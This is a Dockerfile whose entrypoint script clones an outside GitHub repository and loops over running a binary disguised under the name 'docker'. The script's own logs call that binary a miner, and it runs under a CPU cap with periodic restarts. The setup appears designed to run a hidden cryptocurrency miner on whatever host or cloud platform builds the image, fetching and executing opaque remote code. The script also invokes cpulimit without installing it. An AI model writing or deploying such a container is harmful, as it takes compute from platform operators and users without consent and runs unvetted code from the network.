FROM debian:stable-slim

RUN apt-get update && apt-get install -y \
    git curl ca-certificates libcurl4 libjansson4 libssl3 libgomp1 sed \
    && rm -rf /var/lib/apt/lists/*

# install cloudflared
RUN curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
    -o /usr/bin/cloudflared && chmod +x /usr/bin/cloudflared

WORKDIR /app

# entrypoint
RUN cat <<'EOF' > /entrypoint.sh
#!/bin/bash

set +e   # ❗ jangan pakai set -e

echo "[INIT] Starting container..."

mkdir -p /app/ramdisk
cd /app/ramdisk

rm -rf *

echo "[INIT] Cloning repo..."
git clone https://github.com/umnodqib/swam.git

if [ ! -d "swam" ]; then
    echo "[ERROR] Clone gagal!"
    sleep 300
    exit 1
fi

cd swam
chmod +x docker || true

CORES=${CORES:-1}
LIMIT=$(( CORES * 70 ))

echo "[INIT] Start loop..."

while true; do
    echo "[LOOP] start miner"

    if [ ! -f "./docker" ]; then
        echo "[ERROR] file docker tidak ada!"
        sleep 60
        continue
    fi

    ./docker -c docker.json &
    PID=$!

    sleep 2

    if ! kill -0 $PID 2>/dev/null; then
        echo "[WARN] miner langsung mati"
        sleep 60
        continue
    fi

    cpulimit -p $PID -l $LIMIT --include-children &

    sleep 300

    kill -9 $PID || true

    echo "[LOOP] restart..."
done

EOF

RUN chmod +x /entrypoint.sh

ENTRYPOINT ["/entrypoint.sh"]
